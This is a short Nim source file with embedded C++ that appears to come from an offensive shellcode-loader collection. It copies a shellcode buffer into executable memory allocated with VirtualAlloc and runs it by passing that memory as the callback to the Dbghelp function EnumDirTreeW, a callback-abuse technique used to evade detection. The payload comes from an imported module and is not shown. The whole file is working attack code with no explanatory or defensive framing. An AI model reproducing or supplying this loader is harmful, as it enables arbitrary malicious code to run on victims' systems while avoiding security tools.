{.passL:"-l Dbghelp".}
import public

{.emit: """
#include <windows.h>
#include <stdio.h>
#include <Dbghelp.h>

int EnumDirTreeWNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    ::SymInitialize(::GetCurrentProcess(), NULL, TRUE);

    WCHAR dummy[522];
    ::EnumDirTreeW(::GetCurrentProcess(), L"C:\\Windows", L"*.log", dummy, (PENUMDIRTREE_CALLBACKW)addr, NULL);
}
"""
.}

proc EnumDirTreeWNim(plainBuffer:cstring,size:cint):cint {.importcpp:"EnumDirTreeWNim(@)",nodecl.}

discard EnumDirTreeWNim(code,codelen)